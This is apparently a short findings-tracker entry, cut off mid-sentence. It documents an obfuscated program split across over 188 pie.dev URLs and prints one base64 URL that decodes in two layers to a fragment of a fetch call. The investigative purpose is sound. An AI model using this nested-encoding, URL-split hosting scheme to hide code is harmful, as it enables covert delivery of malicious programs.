Transluce findings tracker. pie.dev seems to have been used for an elaborate obfuscated program split accross over 188 unique pie.dev urls, which has multiple further obfuscated payloads such as:

`pie.dev/base64/ZC5hNDE9J1pYUmphQ2duTDJGdWVYUm9hVzVuTDBzNE5qVkZVbEluTEh0b1pXRmtaWEp6T25zbic=`

which decodes to

`d.a41='ZXRjaCgnL2FueXRoaW5nL0s4NjVFUlInLHtoZWFkZXJzOnsn'`

which in turn decodes to

`etch('/anything/K865ERR',{headers:{'`

(i.e. a small part of the full program)

There is a bootstrapping script that uses da.gd-sho
